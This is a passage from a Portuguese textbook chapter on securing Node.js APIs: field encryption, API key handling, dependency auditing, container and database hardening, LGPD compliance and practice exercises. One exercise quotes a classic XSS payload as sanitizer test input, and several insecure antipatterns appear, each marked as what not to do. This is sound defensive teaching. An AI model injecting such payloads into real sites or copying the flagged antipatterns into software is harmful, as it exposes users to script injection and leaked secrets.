A criptografia em trânsito (TLS) protege os dados durante a transmissão. A **criptografia em repouso** (*encryption at rest*) protege os dados armazenados no banco de dados contra acesso não autorizado — por exemplo, no caso de um backup exposto ou acesso físico ao servidor.

Nem todos os campos sensíveis precisam de criptografia individual — para a maioria dos dados pessoais, a criptografia do volume de disco (disponível em todos os provedores de nuvem) é suficiente. Campos de altíssima sensibilidade — números de cartão de crédito, documentos de identidade, dados médicos — merecem criptografia ao nível da aplicação.

O módulo `crypto` nativo do Node.js fornece primitivas criptográficas para isso. O algoritmo recomendado é **AES-256-GCM** (*Galois/Counter Mode*), que fornece confidencialidade e autenticação (detecta adulteração dos dados):

```javascript
// src/utils/criptografia.js
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto';

const ALGORITMO   = 'aes-256-gcm';
const CHAVE       = Buffer.from(process.env.ENCRYPTION_KEY, 'hex'); // 32 bytes = 256 bits
const IV_LENGTH   = 12;  // 96 bits — recomendado para GCM
const TAG_LENGTH  = 16;  // 128 bits — tag de autenticação

export function criptografar(texto) {
  const iv         = randomBytes(IV_LENGTH);
  const cipher     = createCipheriv(ALGORITMO, CHAVE, iv);
  const criptografado = Buffer.concat([
    cipher.update(texto, 'utf8'),
    cipher.final(),
  ]);
  const authTag = cipher.getAuthTag();

  // Concatena IV + tag + dados criptografados em um único buffer
  return Buffer.concat([iv, authTag, criptografado]).toString('base64');
}

export function descriptografar(dadosBase64) {
  const buffer       = Buffer.from(dadosBase64, 'base64');
  const iv           = buffer.subarray(0, IV_LENGTH);
  const authTag      = buffer.subarray(IV_LENGTH, IV_LENGTH + TAG_LENGTH);
  const criptografado = buffer.subarray(IV_LENGTH + TAG_LENGTH);

  const decipher = createDecipheriv(ALGORITMO, CHAVE, iv);
  decipher.setAuthTag(authTag);

  return Buffer.concat([
    decipher.update(criptografado),
    decipher.final(),
  ]).toString('utf8');
}
```

```bash
# Gera uma chave de 256 bits em hexadecimal
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

```javascript
// Uso em um service
async criarDocumento({ usuarioId, cpf, numeroCartao }) {
  const cpfCriptografado    = criptografar(cpf);
  const cartaoCriptografado = criptografar(numeroCartao);

  return prisma.documento.create({
    data: {
      usuarioId,
      cpf:         cpfCriptografado,
      numeroCartao: cartaoCriptografado,
    },
  });
}
```

---

## 10.11 Gestão de Chaves de API

### 10.11.1 Geração e armazenamento seguro

As **chaves de API** são tokens de autenticação utilizados para identificar e autorizar clientes em APIs — especialmente em contextos de integração entre sistemas (M2M, *machine-to-machine*), onde não há um usuário humano realizando login. Um exemplo é a integração de um sistema de e-commerce com a API de pagamentos: o e-commerce autentica-se na API do gateway com uma chave de API, não com e-mail e senha.

A geração de chaves de API deve utilizar um gerador criptograficamente seguro. O formato `prefixo_base64` (adotado por provedores como Stripe e GitHub) facilita a identificação visual e a busca por vazamentos em repositórios:

```javascript
// src/utils/apiKey.js
import { randomBytes, createHash } from 'crypto';

export function gerarApiKey(prefixo = 'sk') {
  const bytes    = randomBytes(32);                    // 256 bits de entropia
  const chave    = bytes.toString('base64url');        // URL-safe base64
  const apiKey   = `${prefixo}_${chave}`;

  // Armazena apenas o hash — nunca a chave em texto puro
  const hash     = createHash('sha256').update(apiKey).digest('hex');

  return { apiKey, hash }; // apiKey é retornada uma vez ao cliente; hash vai para o banco
}

export function hashApiKey(apiKey) {
  return createHash('sha256').update(apiKey).digest('hex');
}
```

```prisma
// prisma/schema.prisma
model ApiKey {
  id        Int      @id @default(autoincrement())
  hash      String   @unique           // SHA-256 da chave — nunca a chave em texto puro
  nome      String                     // descrição: "Integração ERP"
  usuarioId Int      @map("usuario_id")
  ativa     Boolean  @default(true)
  criadoEm DateTime @default(now())   @map("criado_em")
  ultimoUso DateTime?                  @map("ultimo_uso")
  usuario   Usuario  @relation(fields: [usuarioId], references: [id])

  @@map("api_keys")
}
```

### 10.11.2 Middleware de validação de API Key

```javascript
// src/middlewares/apiKey.middleware.js
import { hashApiKey }    from '../utils/apiKey.js';
import { AppError }      from '../utils/AppError.js';
import { prisma }        from '../config/database.js';

export const autenticarApiKey = async (req, res, next) => {
  const apiKey = req.headers['x-api-key'];
  if (!apiKey) return next(new AppError('API Key não fornecida', 401));

  const hash   = hashApiKey(apiKey);
  const registro = await prisma.apiKey.findUnique({
    where:   { hash },
    include: { usuario: true },
  });

  if (!registro || !registro.ativa) {
    return next(new AppError('API Key inválida ou revogada', 401));
  }

  // Atualiza o timestamp do último uso (sem bloquear a requisição)
  prisma.apiKey.update({
    where: { id: registro.id },
    data:  { ultimoUso: new Date() },
  }).catch(() => {}); // falha silenciosa — não crítica

  req.usuario = {
    sub:   registro.usuario.id,
    email: registro.usuario.email,
    papel: registro.usuario.papel,
  };

  next();
};
```

### 10.11.3 Rotação e revogação

As chaves de API devem ter mecanismos explícitos de rotação (geração de nova chave e invalidação da anterior) e revogação imediata. A revogação é simples com o modelo proposto: basta atualizar `ativa = false` na tabela `ApiKeys`. Para auditoria, é preferível não deletar registros de chaves revogadas.

A vida útil das chaves deve ser limitada — chaves de longa duração representam uma janela de exposição prolongada em caso de vazamento. Boas práticas incluem rotação obrigatória a cada 90 dias e alertas quando uma chave não é utilizada por um período prolongado (possível abandono ou comprometimento).

---

## 10.12 Vulnerabilidades em Dependências de Terceiros

### 10.12.1 A superfície de ataque das dependências

Uma aplicação Node.js moderna possui, tipicamente, centenas de dependências transitivas — pacotes que são dependências de dependências. Cada um desses pacotes representa uma potencial superfície de ataque: uma vulnerabilidade em qualquer deles pode comprometer toda a aplicação. O ataque à cadeia de suprimentos de software (*supply chain attack*) tornou-se uma das ameaças mais relevantes nos últimos anos, com incidentes notáveis como o comprometimento do pacote `event-stream` (2018) e o incidente `left-pad` (2016).

### 10.12.2 `npm audit` e gestão de vulnerabilidades conhecidas

O `npm audit` verifica as dependências do projeto contra o banco de dados de vulnerabilidades conhecidas do npm, reportando CVEs (*Common Vulnerabilities and Exposures*) com severidade classificada:

```bash
# Auditoria completa
npm audit

# Correção automática para vulnerabilidades com fix disponível
npm audit fix

# Forçar correção mesmo com mudanças de versão major (requer teste)
npm audit fix --force

# Relatório em formato JSON para integração com CI/CD
npm audit --json
```

O `npm audit` deve ser executado regularmente e integrado ao pipeline de CI/CD. Uma vulnerabilidade de severidade `critical` ou `high` deve bloquear o deploy até ser resolvida.

### 10.12.3 Snyk para monitoramento contínuo

O **Snyk** estende as capacidades do `npm audit` com monitoramento contínuo — notifica a equipe quando novas vulnerabilidades são descobertas em dependências já instaladas, sem necessidade de executar manualmente:

```bash
npm install -g snyk
snyk auth          # autentica com conta Snyk (gratuita para projetos open source)
snyk test          # verifica vulnerabilidades
snyk monitor       # registra o projeto para monitoramento contínuo
```

### 10.12.4 Estratégias de atualização segura

A atualização de dependências deve ser uma prática regular, não reativa. A estratégia recomendada é:

Utilizar o **Dependabot** (integrado ao GitHub) ou o **Renovate** para abrir pull requests automáticos quando novas versões de dependências são publicadas. Esses pull requests podem ser configurados para executar a suíte de testes automaticamente — se os testes passam, a atualização é segura.

Para dependências com mudanças de versão *major* (que podem ter breaking changes), a revisão manual e a execução da suíte de testes completa são obrigatórias antes do merge.

O comando `npm outdated` lista todas as dependências com versões mais recentes disponíveis:

```bash
npm outdated
# Saída:
# Package          Current  Wanted  Latest
# express           4.18.2  4.18.3   4.19.0
# prisma             5.0.0   5.0.0    5.8.0
```

---

## 10.13 Falhas de Configuração

### 10.13.1 O ambiente de produção como superfície de ataque

As falhas de configuração — segunda categoria mais prevalente no OWASP Top 10 geral — são particularmente insidiosas porque frequentemente não envolvem erros no código da aplicação, mas na forma como ela é implantada e operada. Configurações padrão de frameworks, servidores e plataformas de nuvem tendem a priorizar conveniência sobre segurança, e a omissão de configurações explícitas resulta em uma postura de segurança mais fraca do que o necessário.

### 10.13.2 Variáveis de ambiente e gestão de segredos em produção

O padrão de armazenar configurações sensíveis em variáveis de ambiente (introduzido no Capítulo 5) é o correto — mas a forma como essas variáveis são gerenciadas em produção importa tanto quanto seu uso no código.

**O que nunca fazer:**

```bash
# ❌ NUNCA versionar arquivos .env com valores reais
git add .env   # expõe segredos no histórico do Git para sempre

# ❌ NUNCA deixar valores padrão inseguros em código
const SECRET = process.env.JWT_SECRET || 'secret';
// Em produção sem a variável definida, usa 'secret' — completamente previsível
```

**O que fazer:**

```javascript
// ✅ Falhar explicitamente se segredos críticos não estiverem definidos
const variavelObrigatoria = (nome) => {
  const valor = process.env[nome];
  if (!valor) throw new Error(`Variável de ambiente obrigatória não definida: ${nome}`);
  return valor;
};

const JWT_SECRET         = variavelObrigatoria('JWT_SECRET');
const DATABASE_URL       = variavelObrigatoria('DATABASE_URL');
const ENCRYPTION_KEY     = variavelObrigatoria('ENCRYPTION_KEY');
```

Em produção, o gerenciamento de segredos deve utilizar ferramentas dedicadas: **AWS Secrets Manager**, **HashiCorp Vault**, **Doppler** ou os mecanismos nativos da plataforma de implantação (Railway, Heroku, Render, Vercel — todos oferecem gerenciamento de variáveis de ambiente com criptografia em repouso).

### 10.13.3 Segurança em containers Docker

```dockerfile
# ❌ Antipadrão — executa como root
FROM node:20
WORKDIR /app
COPY . .
RUN npm ci
CMD ["node", "src/server.js"]

# ✅ Boas práticas de segurança em containers
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production  # apenas dependências de produção

FROM node:20-alpine AS runner
# Cria usuário sem privilégios
RUN addgroup -g 1001 nodejs && adduser -u 1001 -G nodejs -s /bin/sh -D appuser
WORKDIR /app

# Copia apenas o necessário — sem código-fonte, sem node_modules de dev
COPY --from=builder /app/node_modules ./node_modules
COPY --chown=appuser:nodejs src ./src
COPY --chown=appuser:nodejs prisma ./prisma
COPY --chown=appuser:nodejs package.json ./

# Executa como usuário não-root
USER appuser

EXPOSE 3000
CMD ["node", "src/server.js"]
```

Princípios de segurança em containers: executar como usuário não-root, utilizar imagens base mínimas (Alpine), não incluir ferramentas de desenvolvimento na imagem de produção, e escanear a imagem por vulnerabilidades com `docker scout` ou `trivy`.

### 10.13.4 Princípio do menor privilégio em infraestrutura

O **princípio do menor privilégio** (*principle of least privilege*) estabelece que cada componente do sistema deve ter acesso apenas aos recursos estritamente necessários para sua função. Aplicado à infraestrutura:

O usuário do banco de dados utilizado pela aplicação em produção deve ter apenas as permissões necessárias — `SELECT`, `INSERT`, `UPDATE`, `DELETE` nas tabelas da aplicação. Não deve ter permissão para `DROP TABLE`, `CREATE TABLE` ou acesso a outros bancos de dados no mesmo servidor:

```sql
-- Criar usuário restrito para a aplicação
CREATE USER app_user WITH PASSWORD 'senha_forte';
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO app_user;
-- NÃO conceder: DROP, CREATE, TRUNCATE, acesso a outros schemas
```

As migrations do banco (que exigem permissões mais amplas) devem ser executadas com um usuário distinto, com maior privilégio, apenas durante o processo de deploy — não pela instância da aplicação em execução contínua.

---

## 10.14 LGPD e Privacy by Design

### 10.14.1 A Lei Geral de Proteção de Dados Pessoais

A **Lei Geral de Proteção de Dados Pessoais** (LGPD — Lei nº 13.709/2018) é a legislação brasileira que regula o tratamento de dados pessoais por pessoas naturais e jurídicas, nos setores público e privado. Inspirada no GDPR europeu (*General Data Protection Regulation*), a LGPD estabelece princípios, direitos dos titulares e obrigações para os agentes de tratamento, com penalidades que podem chegar a 2% do faturamento da empresa no Brasil, limitado a R$ 50 milhões por infração.

Para o desenvolvedor de sistemas, a LGPD não é apenas uma questão jurídica — é uma especificação de requisitos técnicos que deve ser incorporada desde as fases iniciais do projeto.

### 10.14.2 Conceitos fundamentais

**Dado pessoal** é qualquer informação relacionada a pessoa natural identificada ou identificável: nome, e-mail, CPF, endereço IP, cookies de rastreamento, dados de localização. Dados pessoais *sensíveis* — origem racial, convicção religiosa, dados de saúde, biometria, dados sobre criança ou adolescente — recebem proteção adicional.

**Titular** é a pessoa natural a quem os dados se referem.

**Controlador** é a pessoa natural ou jurídica que toma as decisões sobre o tratamento dos dados — no contexto deste curso, a empresa que opera a aplicação.

**Operador** é quem realiza o tratamento em nome do controlador — um serviço de hospedagem, um provedor de e-mail transacional, uma empresa de analytics.

**Bases legais** são os fundamentos jurídicos que autorizam o tratamento. As principais bases relevantes para aplicações web são: **consentimento** (expresso, específico e informado), **execução de contrato** (tratamento necessário para cumprir um contrato com o titular), **legítimo interesse** (quando o tratamento é necessário para atender interesses legítimos do controlador, não prevalecendo sobre os direitos do titular) e **cumprimento de obrigação legal**.

### 10.14.3 Direitos do titular e implicações técnicas

A LGPD garante ao titular direitos que geram requisitos funcionais diretos na aplicação:

| Direito | Implicação técnica |
|---------|-------------------|
| **Acesso** | Endpoint para o usuário visualizar todos os seus dados |
| **Correção** | Endpoint para atualizar dados incorretos ou desatualizados |
| **Anonimização ou exclusão** | Endpoint de "exclusão de conta" — apaga ou anonimiza os dados |
| **Portabilidade** | Exportação dos dados em formato interoperável (JSON, CSV) |
| **Informação** | Política de privacidade clara sobre finalidade e compartilhamento |
| **Revogação do consentimento** | Mecanismo para retirar o consentimento com a mesma facilidade com que foi concedido |

```javascript
// Exemplo: endpoint de exportação de dados (portabilidade)
router.get('/meus-dados', autenticar, async (req, res, next) => {
  try {
    const usuarioId = req.usuario.sub;
    const dados = await prisma.usuario.findUnique({
      where:   { id: usuarioId },
      select: {
        id: true, nome: true, email: true, criadoEm: true,
        pedidos:   { select: { id: true, total: true, criadoEm: true } },
        // senha deliberadamente omitida
      },
    });
    // Cabeçalho para download como arquivo
    res.setHeader('Content-Disposition', 'attachment; filename="meus-dados.json"');
    res.json(dados);
  } catch (err) { next(err); }
});

// Exemplo: endpoint de exclusão de conta (direito ao esquecimento)
router.delete('/minha-conta', autenticar, async (req, res, next) => {
  try {
    const usuarioId = req.usuario.sub;
    // Anonimiza em vez de deletar para preservar integridade referencial
    await prisma.usuario.update({
      where: { id: usuarioId },
      data:  {
        nome:  `[Removido]`,
        email: `removido_${usuarioId}@anonimizado.local`,
        senha: '',
        // Dados de pedidos são preservados para fins contábeis (obrigação legal)
      },
    });
    res.status(204).send();
  } catch (err) { next(err); }
});
```

### 10.14.4 Privacy by Design e Privacy by Default

**Privacy by Design** é o princípio, incorporado explicitamente na LGPD (Art. 46), de que a proteção de dados pessoais deve ser integrada ao projeto do sistema desde sua concepção, não adicionada como medida posterior. Ann Cavoukian, que formulou o princípio originalmente, identifica sete fundamentos: proatividade, privacidade como padrão, privacidade incorporada ao design, funcionalidade total (privacidade sem comprometer funcionalidade), segurança ponta a ponta, visibilidade e transparência, e respeito pela privacidade do usuário.

**Privacy by Default** (privacidade como padrão) estabelece que, na ausência de uma escolha explícita do usuário, a configuração padrão do sistema deve ser a mais protetora da privacidade. Na prática, isso significa: coletar apenas os dados estritamente necessários para a finalidade declarada, não pré-marcar caixas de consentimento, e não solicitar permissões que não são imediatamente necessárias.

Implicações técnicas práticas para o desenvolvedor:

**Minimização de dados** — não coletar campos além do necessário. Se a data de nascimento não é necessária para o funcionamento do sistema, não deve estar no cadastro.

**Retenção limitada** — definir e implementar políticas de retenção: após quanto tempo os dados inativos são anonimizados ou excluídos?

**Pseudonimização** — substituir identificadores diretos (nome, CPF) por identificadores artificiais em logs e análises, de forma que os dados não sejam diretamente associáveis ao titular sem informação adicional.

**Registro de tratamento** — manter um mapeamento (*data map*) de quais dados são coletados, com qual finalidade, com qual base legal e com quais terceiros são compartilhados.

---

## 10.15 Checklist de Segurança para Produção

O checklist a seguir consolida as práticas abordadas neste capítulo e nos anteriores em um instrumento verificável antes de cada implantação em produção.

### Autenticação e Autorização
- [ ] Senhas armazenadas com bcrypt (custo ≥ 12)
- [ ] JWT com expiração curta (≤ 60 min) e Refresh Token com rotação
- [ ] Refresh Tokens armazenados e revogáveis no banco de dados
- [ ] RBAC implementado e testado para todas as rotas protegidas
- [ ] MFA disponível para contas de administrador
- [ ] Rate limiting restritivo nas rotas de login e cadastro
- [ ] Mensagens de erro genéricas para falhas de autenticação (sem revelar se e-mail existe)

### Cabeçalhos e Transporte
- [ ] Helmet configurado com CSP, HSTS, X-Frame-Options, Referrer-Policy
- [ ] HTTPS obrigatório — redirecionamento de HTTP para HTTPS
- [ ] HSTS com `maxAge` ≥ 1 ano e `includeSubDomains`
- [ ] CORS restrito às origens de produção conhecidas

### Proteção contra Ataques
- [ ] Todas as queries ao banco utilizam parâmetros posicionais (nunca concatenação)
- [ ] `$queryRawUnsafe` do Prisma ausente ou com validação de allowlist rigorosa
- [ ] Entrada do usuário sanitizada antes de armazenamento em HTML (sanitize-html)
- [ ] Tokens CSRF em formulários SSR (ou JWT no header para SPAs)
- [ ] Verificação de propriedade do recurso em todos os endpoints com parâmetro de ID
- [ ] URLs fornecidas pelo usuário validadas antes de requisições server-side (anti-SSRF)

### Dados e Privacidade
- [ ] Campos `senha` excluídos de todas as respostas da API
- [ ] Dados sensíveis criptografados com AES-256-GCM no banco (se aplicável)
- [ ] Logs não contêm dados pessoais (tokens, senhas, CPF, cartão)
- [ ] Política de retenção de dados definida e implementada
- [ ] Endpoints de acesso, exportação e exclusão de dados implementados (LGPD)
- [ ] `.env` e arquivos de segredos no `.gitignore`

### Infraestrutura e Dependências
- [ ] `npm audit` sem vulnerabilidades `high` ou `critical`
- [ ] Container executa como usuário não-root
- [ ] Usuário do banco de dados com permissões mínimas
- [ ] Variáveis de ambiente obrigatórias validadas na inicialização
- [ ] Dependabot ou Renovate configurado para atualizações automáticas
- [ ] `NODE_ENV=production` definido em produção
- [ ] Stack traces não expostos em respostas de erro em produção

### Monitoramento
- [ ] Logs estruturados com nível de severidade
- [ ] Alertas configurados para erros 5xx e picos de 4xx
- [ ] Registro de tentativas de autenticação falhas

---

## 10.16 Exercícios Práticos

### Exercício 10.1 — Auditoria de injeção SQL

Revise o código do projeto desenvolvido ao longo do curso e identifique todos os pontos onde consultas SQL são construídas. Verifique que: (a) todas as operações via API do Prisma são seguras por padrão; (b) caso existam chamadas a `$queryRaw`, confirme que utilizam tagged template literals e não `$queryRawUnsafe`. Se houver algum uso de `pg` diretamente (Capítulo 5, seção 5.3), confirme que todos os valores são passados como parâmetros posicionais.

### Exercício 10.2 — XSS e sanitização

Adicione ao projeto um endpoint `POST /api/posts` que recebe um campo `conteudo` com HTML rico. Implemente a sanitização com `sanitize-html` para permitir apenas as tags `<b>`, `<i>`, `<p>`, `<br>` e `<a>` (com atributo `href` restrito a `https://`). Escreva testes que verifiquem: (a) que um payload XSS clássico (`<script>alert('xss')</script>`) é removido; (b) que o conteúdo legítimo com as tags permitidas é preservado.

### Exercício 10.3 — IDOR e controle de acesso

Implemente um endpoint `GET /api/pedidos/:id` e `DELETE /api/pedidos/:id`. Escreva testes de integração com Supertest que verifiquem: (a) um usuário autenticado pode acessar seus próprios pedidos; (b) um usuário autenticado recebe 403 ao tentar acessar pedidos de outro usuário; (c) um ADMIN pode acessar qualquer pedido.

### Exercício 10.4 — MFA com TOTP

Implemente o fluxo completo de MFA no projeto: endpoint `POST /api/auth/mfa/iniciar` (retorna QR Code), `POST /api/auth/mfa/confirmar` (ativa o MFA após verificação do primeiro código) e integre a verificação do código MFA no endpoint de login quando `mfaAtivo = true`. Utilize o Google Authenticator ou Authy para verificar o fluxo manualmente.

### Exercício 10.5 — Criptografia de dados sensíveis

Adicione um campo `cpf` ao model `Usuario`. Implemente a criptografia com AES-256-GCM no service, de forma que o CPF seja armazenado criptografado no banco e descriptografado ao ser retornado. Verifique no banco de dados (via Prisma Studio ou psql) que o valor armazenado é ininteligível, e que a aplicação retorna o CPF em texto claro ao usuário autenticado correspondente.

### Exercício 10.6 — Auditoria e análise da LGPD

Execute `npm audit` no projeto e analise o relatório. Em seguida, identifique quais dados pessoais a aplicação coleta e processe as seguintes perguntas em um texto de 300 a 500 palavras: (a) Qual a base legal para cada tipo de dado coletado? (b) A aplicação implementa os direitos de acesso, portabilidade e exclusão garantidos pela LGPD? (c) Quais melhorias seriam necessárias para que a aplicação estivesse em conformidade com os princípios de Privacy by Design?

---

## 10.17 Referências e Leituras Complementares

- [OWASP API Security Top 10 — 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [OWASP Top 10 — 2021](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [IBM Cost of a Data Breach Report 2023](https://www.ibm.com/reports/data-breach)
- [RFC 6238 — TOTP: Time-Based One-Time Password Algorithm](https://datatracker.ietf.org/doc/html/rfc6238)
- [NIST SP 800-63B — Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [Helmet.js — documentação](https://helmetjs.github.io/)
- [sanitize-html — documentação](https://www.npmjs.com/package/sanitize-html)
- [speakeasy — documentação](https://www.npmjs.com/package/speakeasy)
- [Snyk — documentação](https://docs.snyk.io/)
- BRASIL. Lei nº 13.709, de 14 de agosto de 2018. *Lei Geral de Proteção de Dados Pessoais (LGPD)*. Brasília, DF, 2018. Disponível em: [planalto.gov.br](https://www.planalto.gov.br/ccivil_03/_ato2015-2018/2018/lei/l13709.htm).
- CAVOUKIAN, A. *Privacy by Design: The 7 Foundational Principles*. Information and Privacy Commissioner of Ontario, 2009.
- STALLINGS, W.; BROWN, L. *Computer Security: Principles and Practice*. 4ª ed. Pearson, 2018. — Capítulos 3 (User Authentication) e 11 (Software Security).

---

!!! note "Próximo Capítulo"
    No **Capítulo 11 — Deploy e Infraestrutura**, colocaremos a aplicação em produção: configuração de variáveis de ambiente em plataformas de nuvem, pipelines de CI/CD com GitHub Actions, deploy no Railway e Render, monitoramento de logs e erros com ferramentas como Sentry, e estratégias de atualização sem downtime. As práticas de segurança estabelecidas neste capítulo — especialmente o checklist da seção 10.15 — serão verificadas como parte do processo de deploy.
